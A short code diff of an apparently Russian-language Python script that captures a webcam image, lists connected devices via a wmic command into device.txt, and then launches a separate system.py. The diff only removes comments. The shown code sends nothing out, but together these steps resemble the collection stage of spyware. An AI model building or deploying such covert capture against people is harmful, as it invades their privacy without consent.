@@ -29,14 +29,13 @@ def get_connected_devices(output_file="device.txt"):
 
     devices_info = []
 
-    # Информация о микрофоне, клавиатуре и мышке (для Windows)
     try:
         devices = subprocess.check_output(
             "wmic path Win32_PnPEntity get Name",
             shell=True,
             text=True,
-            encoding="utf-8",  # Используем UTF-8 для обработки символов
-            errors="replace"  # Заменяем недекодируемые символы на знак вопроса
+            encoding="utf-8",
+            errors="replace"
         )
         devices_info.append("=== УСТРОЙСТВА ПОДКЛЮЧЕННЫЕ К ПК ===")
         devices_info.extend(devices.splitlines())
@@ -66,11 +65,8 @@ def run_system_script():
 if __name__ == "__main__":
     webcam_folder = "webcam"
 
-    # Снимок с вебкамеры
     capture_webcam_image(folder=webcam_folder)
 
-    # Сохранение информации о подключенных устройствах
     get_connected_devices(output_file="device.txt")
 
-    # Запуск скрипта system.py
     run_system_script()
